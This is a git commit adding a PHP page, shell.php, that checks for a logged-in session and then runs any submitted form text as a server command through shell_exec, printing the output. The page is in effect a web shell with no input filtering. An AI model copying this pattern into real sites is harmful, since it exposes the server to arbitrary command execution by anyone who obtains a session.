6f003996131d203a95f96cf29d4828384d831d80
wasdthedebugger <wasdthedebugger@gmail.com>
2022-06-01 21:55:11 +0545

    Added Files

---
+++ shell.php
@@ -0,0 +1,47 @@
+<?php
+require_once("authenticate.php");
+if (!isset($_SESSION['UID'])) {
+    header("Location: index.php");
+    die();
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <link rel="stylesheet" href="shell.css">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SHELL</title>
+</head>
+
+<body>
+    <div class="main">
+    <div class="center">
+
+        <div class="output">
+            <?php
+            $command = isset($_POST['command']) ? $_POST['command'] : 'CMD';
+            $output = shell_exec($command);
+            ?>
+        </div>
+
+        <div class="display">
+            <?php
+            echo ($output);
+            ?>
+        </div>
+
+        <div class="input">
+            <form action="shell.php" method="POST">
+                <input type="text" name="command" id="command">
+            </form>
+        </div>
+
+    </div>
+    </div>
+</body>
+
+</html>
